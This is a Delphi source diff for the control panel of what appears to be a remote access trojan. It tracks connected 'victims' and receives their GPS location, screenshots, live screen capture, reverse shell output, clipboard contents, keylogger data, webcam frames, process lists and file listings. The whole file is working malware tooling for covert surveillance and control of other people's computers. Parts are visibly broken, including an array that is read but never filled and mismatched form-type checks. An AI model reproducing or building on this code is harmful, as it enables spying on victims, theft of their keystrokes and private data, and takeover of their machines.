+  ExistingItem: TListItem;
+  Form17: TForm17;
+  MemoryStream: TBytesStream;
+  ImageBytes: TBytes;
+  Base64String, DataStr: string;
+begin
+  sl := TStringList.Create;
+  sl.Delimiter := '|';
+  sl.StrictDelimiter := true;
+  sl.DelimitedText := stringof(aData);
+
+  if sl[0] = 'NewCon' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+        GraphTab: TTabSheet;
+        GraphFrame: TFrame2; // Change to TFrame2 as per your context
+        ListItem: TListItem;
+        li: TListItem;
+        UserData: TConnectedUserData;
+        Reconnected: Boolean;
+        RandomX, RandomY: Integer;
+        TabWidth, TabHeight: Integer;
+      begin
+
+        Reconnected := False;
+        for I := ListView3.Items.Count - 1 downto 0 do
+        begin
+          if ListView3.Items[I].SubItems[1] = sl[2] then
+          begin
+            ListView3.Items.Delete(I);
+            Reconnected := true;
+            Break;
+          end;
+        end;
+
+        UserData := TConnectedUserData.Create;
+        UserData.Line := aLine;
+        UserData.ID := sl[2];
+        ConnectedUsers.AddObject(sl[2], UserData);
+
+        ListItem := ListView4.Items.Add;
+        ListItem.Caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
+        if Reconnected then
+          ListItem.SubItems.Add('Client has reconnected @' + aLine.PeerIP)
+        else
+          ListItem.SubItems.Add('New client has connected @' + aLine.PeerIP);
+        li := ListView2.Items.Add;
+        li.Caption := aLine.PeerIP;
+        li.SubItems.Add(sl[1]);
+        li.SubItems.Add(sl[2]);
+        li.SubItems.Add(sl[3]);
+        li.SubItems.Add(sl[4]);
+        li.SubItems.Add(sl[5]);
+        li.SubItems.Add(sl[6]);
+        li.SubItems.Add(sl[7]);
+        li.SubItems.Add(sl[8]);
+        li.SubItems.Add(sl[9]);
+        li.SubItems.Add(sl[10]);
+        li.SubItems.Add(sl[11]);
+        GraphTab := nil;
+
+        for I := 0 to PageControl1.PageCount - 1 do
+        begin
+          if PageControl1.Pages[I].Name = 'Graph' then
+          begin
+            GraphTab := PageControl1.Pages[I];
+            Break;
+          end;
+        end;
+
+        GraphTab := nil;
+        for I := 0 to PageControl1.PageCount - 1 do
+        begin
+          if PageControl1.Pages[I].Name = 'Graph' then
+          begin
+            GraphTab := PageControl1.Pages[I];
+            Break;
+          end;
+        end;
+
+        if Assigned(GraphTab) then
+        begin
+          GraphFrame := TFrame2.Create(GraphTab);
+          GraphFrame.Parent := GraphTab;
+          GraphFrame.Label3.Caption := aLine.PeerIP + '//' + sl[6];
+          GraphFrame.Label4.Caption := sl[2];
+          TabWidth := GraphTab.ClientWidth;
+          TabHeight := GraphTab.ClientHeight;
+          RandomX := Random(TabWidth - GraphFrame.Width);
+          RandomY := Random(TabHeight - GraphFrame.Height);
+          GraphFrame.SetBounds(RandomX, RandomY, GraphFrame.Width,
+            GraphFrame.Height);
+        end;
+
+        VictimsCount := self.ListView2.Items.Count;
+        StatusBar1.Panels[1].text := 'Online: ' + inttostr(self.VictimsCount);
+        VictimsCount := self.ListView3.Items.Count;
+        StatusBar1.Panels[2].text := 'Offline: ' + inttostr(self.VictimsCount);
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'Location' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        self.TMSFNCMaps1.BeginUpdate;
+        try
+          var
+          Lat := StrToFloat(sl[1]);
+          var
+          Lon := StrToFloat(sl[2]);
+          self.TMSFNCMaps1.AddMarker(Lat, Lon, VictimID);
+        finally
+          self.TMSFNCMaps1.EndUpdate;
+        end;
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'IncomingScreenshot' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        bytestream: TBytesStream;
+      begin
+        bytestream := TBytesStream.Create(Copy(aData, 19, Length(aData)));
+        Image1.Picture.LoadFromStream(bytestream);
+        bytestream.Free;
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'IncomingSSShell' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        UserData: TConnectedUserData;
+        I: Integer;
+        bytestream: TBytesStream;
+        Frame: TForm2; // Declare a variable for the frame
+      begin
+        // Initialize UserData to nil
+        UserData := nil;
+
+        // Loop through all connected users to find the matching line
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        // If no matching user data found, exit
+        if UserData = nil then
+          Exit;
+
+        // Loop through all forms to find the form with the matching Victim ID
+        Form2 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm2 then // Corrected to TForm16
+          begin
+            if TForm2(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form2 := TForm2(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form2 = nil then
+          Exit;
+        Form2.Image1.Visible := true;
+        Form2.Splitter2.Visible := true;
+        bytestream := TBytesStream.Create(Copy(aData, 16, Length(aData)));
+        Form2.Image1.Picture.LoadFromStream(bytestream);
+        bytestream.Free;
+      end);
+  end;
+
+  if sl[0] = 'MSG' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        UserData: TConnectedUserData;
+        I: Integer;
+        bytestream: TBytesStream;
+        Frame: TForm3; // Declare a variable for the frame
+      begin
+        // Initialize UserData to nil
+        UserData := nil;
+
+        // Loop through all connected users to find the matching line
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        // If no matching user data found, exit
+        if UserData = nil then
+          Exit;
+
+        // Loop through all forms to find the form with the matching Victim ID
+        Form3 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm3 then // Corrected to TForm16
+          begin
+            if TForm3(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form3 := TForm3(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        if Form3 = nil then
+          Exit;
+
+        Form3.memo1.Lines.Add(sl[1] + sl[2]);
+      end);
+  end;
+
+  if sl[0] = 'ChatClose' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        UserData: TConnectedUserData;
+        I: Integer;
+        bytestream: TBytesStream;
+        Frame: TForm3; // Declare a variable for the frame
+      begin
+        // Initialize UserData to nil
+        UserData := nil;
+
+        // Loop through all connected users to find the matching line
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        // If no matching user data found, exit
+        if UserData = nil then
+          Exit;
+
+        // Loop through all forms to find the form with the matching Victim ID
+        Form3 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm3 then // Corrected to TForm16
+          begin
+            if TForm3(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form3 := TForm3(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        if Form3 = nil then
+          Exit;
+
+        Form3.PageControl1.ActivePageIndex := 0;
+        Form3.memo1.Lines.Add('');
+        Form3.memo1.Lines.Add('Chat Closed.');
+        Form3.memo1.Lines.Add('');
+      end);
+  end;
+
+  if sl[0] = 'IncomingScreenCapture' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+        UserData: TConnectedUserData;
+        Form9: TForm9;
+        bytestream: TBytesStream;
+        TempBitmap: TBitmap;
+        OldRow, NewRow: PRGBTripleArray;
+        X, Y: Integer;
+      begin
+        // Find the correct user and form as before
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form9 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm9 then
+          begin
+            if TForm9(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form9 := TForm9(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        if Form9 = nil then
+          Exit;
+
+        // Create a bytestream from the received data
+        bytestream := TBytesStream.Create(Copy(aData, 22, Length(aData)));
+        try
+          // Load the bitmap containing the changed pixels
+          TempBitmap := TBitmap.Create;
+          try
+            TempBitmap.LoadFromStream(bytestream);
+
+            // Ensure the FullScreenshotBitmap is initialized
+            if not Assigned(Form9.FullScreenshotBitmap) then
+            begin
+              Form9.FullScreenshotBitmap := TBitmap.Create;
+              Form9.FullScreenshotBitmap.Assign(TempBitmap);
+            end
+            else
+            begin
+              // Ensure the bitmap dimensions match
+              if (Form9.FullScreenshotBitmap.Width <> TempBitmap.Width) or
+                (Form9.FullScreenshotBitmap.Height <> TempBitmap.Height) then
+              begin
+                Form9.FullScreenshotBitmap.Assign(TempBitmap);
+                // Reset if dimensions mismatch
+              end
+              else
+              begin
+                // Apply the pixel changes using ScanLine
+                for Y := 0 to TempBitmap.Height - 1 do
+                begin
+                  OldRow := Form9.FullScreenshotBitmap.ScanLine[Y];
+                  NewRow := TempBitmap.ScanLine[Y];
+                  Move(NewRow^, OldRow^, TempBitmap.Width * SizeOf(TRGBTriple));
+                end;
+              end;
+            end;
+            Form9.Image1.Picture.Bitmap.Assign(Form9.FullScreenshotBitmap);
+          finally
+            TempBitmap.Free;
+          end;
+        finally
+          bytestream.Free;
+        end;
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'ScreenDimations' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form9 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm9 then
+          begin
+            if TForm9(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form9 := TForm9(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form9 = nil then
+          Exit;
+
+        Form9.StatusBar1.Panels[1].text := 'Resolution: ' + sl[1] + 'x' + sl[2];
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'ReverseSHELLCMD' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form11 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm9 then
+          begin
+            if TForm11(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form11 := TForm11(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form11 = nil then
+          Exit;
+        Form11.memo1.Lines.Add(sl[1]);
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'SendClipbrdText' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form14 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm14 then
+          begin
+            if TForm14(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form14 := TForm14(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form14 = nil then
+          Exit;
+        Form14.PageControl1.ActivePageIndex := 0;
+        Form14.memo1.Lines.Add(sl[1]);
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'SendClipbrdImg' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        bytestream: TBytesStream;
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form14 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm14 then
+          begin
+            if TForm14(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form14 := TForm14(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form14 = nil then
+          Exit;
+
+        Form14.PageControl1.ActivePageIndex := 1;
+        bytestream := TBytesStream.Create(Copy(aData, 15, Length(aData)));
+        Form14.Image1.Picture.LoadFromStream(bytestream);
+        bytestream.Free;
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'SendProcList' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+        ProcInfo: TStringList;
+        ProcDetailsArray: TArray<string>;
+        ListItem: TListItem;
+        Form18: TForm18;
+        // Assuming Form8 is the form where the process list will be displayed
+      begin
+        // Initialize UserData to nil
+        UserData := nil;
+
+        // Loop through all connected users to find the matching line
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        // If no matching user data found, exit
+        if UserData = nil then
+          Exit;
+
+        // Loop through all forms to find the form with the matching Victim ID
+        Form18 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm8 then
+          begin
+            if TForm18(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form18 := TForm18(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form18 = nil then
+          Exit;
+
+        // Clear the ListView for fresh data
+        Form18.ListView1.clear;
+
+        ProcInfo := TStringList.Create;
+
+        ListItem := Form18.ListView1.Items.Add;
+        ListItem.Caption := ProcDetailsArray[0];
+        ListItem.SubItems.Add(ProcDetailsArray[1]);
+        ListItem.SubItems.Add(ProcDetailsArray[2]);
+        li := Form1.ListView4.Items.Add;
+        li.Caption := FormatDateTime('dd/mm/yy hh:nn', Now);
+        li.SubItems.Add('Process Info Received @' + aLine.PeerIP);
+
+        ProcInfo.Free;
+      end);
+  end;
+
+  if sl[0] = 'IncomingWebcam' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form17 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm17 then
+          begin
+            if TForm17(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form17 := TForm17(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        if Form17 = nil then
+          Exit;
+
+        DataStr := TEncoding.UTF8.GetString(aData);
+        Base64String := Copy(DataStr, 15, Length(DataStr) - 15);
+        ImageBytes := TNetEncoding.Base64.DecodeStringToBytes(Base64String);
+
+        if Length(ImageBytes) = 0 then
+          Exit;
+
+        MemoryStream := TBytesStream.Create(ImageBytes);
+        try
+          MemoryStream.Position := 0;
+          try
+            Form17.Image1.Picture.LoadFromStream(MemoryStream);
+          except
+            on E: Exception do
+            begin
+
+            end;
+          end;
+        finally
+          MemoryStream.Free;
+        end;
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'WebcamDeviceList' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        // If no matching user data found, exit
+        if UserData = nil then
+          Exit;
+
+        // Loop through all forms to find the form with the matching Victim ID
+        Form17 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm17 then
+          begin
+            if TForm17(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form17 := TForm17(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+        if Form17 = nil then
+          Exit;
+        Form17.ComboBox1.Items.Add(sl[1]);
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'FocWindow' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        // If no matching user data found, exit
+        if UserData = nil then
+          Exit;
+
+        // Loop through all forms to find the form with the matching Victim ID
+        Form20 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm20 then
+          begin
+            if TForm20(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form20 := TForm20(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        if Form20 = nil then
+          Exit;
+        Form20.OnlineMemo.Lines.Add('[' + sl[1] + ']');
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'Keylog' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        // If no matching user data found, exit
+        if UserData = nil then
+          Exit;
+
+        // Loop through all forms to find the form with the matching Victim ID
+        Form20 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm20 then
+          begin
+            if TForm20(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form20 := TForm20(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        if Form20 = nil then
+          Exit;
+        Form20.OnlineMemo.text := Form20.OnlineMemo.text + sl[1];
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'AddFileORFolder' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form21 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm14 then
+          begin
+            if TForm21(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form21 := TForm21(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form21 = nil then
+          Exit;
+
+        li := Form21.ListView1.Items.Add;
+        li.Caption := sl[1];
+        li.SubItems.Add(sl[2]);
+        li.SubItems.Add(sl[3]);
+        li.SubItems.Add(sl[4]);
+        Exit;
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'SendDrives' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      var
+        I: Integer;
+        Drives: TStringList;
+        Drive: string;
+        UserData: TConnectedUserData;
+        ListItem: TListItem;
+      begin
+        // Loop through all connected users to find the matching line
+        UserData := nil;
+        for I := 0 to ConnectedUsers.Count - 1 do
+        begin
+          if TConnectedUserData(ConnectedUsers.Objects[I]).Line = aLine then
+          begin
+            UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+            Break;
+          end;
+        end;
+
+        if UserData = nil then
+          Exit;
+
+        Form21 := nil;
+        for I := 0 to Screen.FormCount - 1 do
+        begin
+          if Screen.Forms[I] is TForm14 then
+          begin
+            if TForm21(Screen.Forms[I]).ThisFormsVictimID = UserData.ID then
+            begin
+              Form21 := TForm21(Screen.Forms[I]);
+              Break;
+            end;
+          end;
+        end;
+
+        // If no matching form found, exit
+        if Form21 = nil then
+          Exit;
+        // Split the drive information from SL[1] and add to ComboBox
+        Drives := TStringList.Create;
+        try
+          Drives.CommaText := sl[1];
+          // Assuming SL[1] is a comma-separated string of drives
+
+          for Drive in Drives do
+          begin
+            Form21.ComboBox1.AddItem(Drive, nil);
+            Form21.ComboBox1.ItemIndex := 0;
+          end;
+
+          ListItem := Form1.ListView4.Items.Add;
+          ListItem.Caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
+          ListItem.SubItems.Add('Drives Received @' + aLine.PeerIP);
+        finally
+          Drives.Free; // Free the TStringList
+        end;
+      end);
+    Exit;
+  end;
+
+  if sl[0] = 'ComputerInfo' then
+  begin
+    TThread.Queue(nil,
+      procedure
+      begin
+        Panel1.Visible := true;
+        Splitter1.Visible := true;
+        ListView1.Items.clear;
+
+        ListItem := ListView1.Items.Add;
+        ListItem.Caption := 'Username:';
+        ListItem.SubItems.Add(sl[1]);
+
+        ListItem := ListView1.Items.Add;
+        ListItem.Caption := 'OS:';
+        ListItem.SubItems.Add(sl[2]);
+
+        ListItem := ListView1.Items.Add;
+        ListItem.Caption := 'RAM:';
+        ListItem.SubItems.Add(sl[3]);
+
+        ListItem := ListView1.Items.Add;
+        ListItem.Caption := 'CPU:';
+        ListItem.SubItems.Add(sl[4]);
+        ListItem := ListView1.Items.Add;
+        ListItem.Caption := 'GPU:';
+        ListItem.SubItems.Add(sl[5]);
+        ListItem := ListView1.Items.Add;
+        ListItem.Caption := 'Uptime:';
+        ListItem.SubItems.Add(sl[6]);
+        ListItem := ListView1.Items.Add;
+        ListItem.Caption := 'IDLE Time:';
+        ListItem.SubItems.Add(sl[7]);
+      end);
+    Exit;
+  end;
+
+end;
+
+procedure TForm1.T1Click(Sender: TObject);
+begin
+  PageControl1.ActivePageIndex := 6;
+end;
+
+procedure TForm1.TreeView2Change(Sender: TObject; Node: TTreeNode);
+begin
+  if Assigned(TreeView2.Selected) then
+  begin
+    case TreeView2.Selected.Index of
+      0:
+        PageControl4.ActivePageIndex := 0;
+      1:
+        PageControl4.ActivePageIndex := 1;
+      2:
+        PageControl4.ActivePageIndex := 2;
+    end;
+  end;
+end;
+
+procedure TForm1.W3Click(Sender: TObject);
+var
+  NewForm: TForm17;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm17.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Webcam | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+procedure TForm1.W4Click(Sender: TObject);
+var
+  NewForm: TForm6;
+  UserData: TConnectedUserData;
+  SelectedID: string;
+begin
+  // Ensure there is a selected item in the ListView
+  if ListView2.Selected = nil then
+  begin
+
+    Exit;
+  end;
+
+  // Get the selected user's ID from the ListView
+  SelectedID := ListView2.Selected.SubItems[1];
+
+  // Find the corresponding UserData object
+  UserData := nil;
+  for var I := 0 to ConnectedUsers.Count - 1 do
+  begin
+    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
+    begin
+      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
+      Break;
+    end;
+  end;
+
+  // If no matching user data found, show an error message
+  if UserData = nil then
+  begin
+    Exit;
+  end;
+
+  // Create a new instance of Form3
+  NewForm := TForm6.Create(nil);
+  try
+    // Set the caption of the new form
+    NewForm.Caption := 'Remote Visit Web | ' + UserData.ID;
+    NewForm.ThisFormsVictimID := UserData.ID;
+    // Show the new form
+    NewForm.show;
+  except
+    // If there is an exception, free the form and re-raise the exception
+    NewForm.Free;
+    raise;
+  end;
+end;
+
+end.
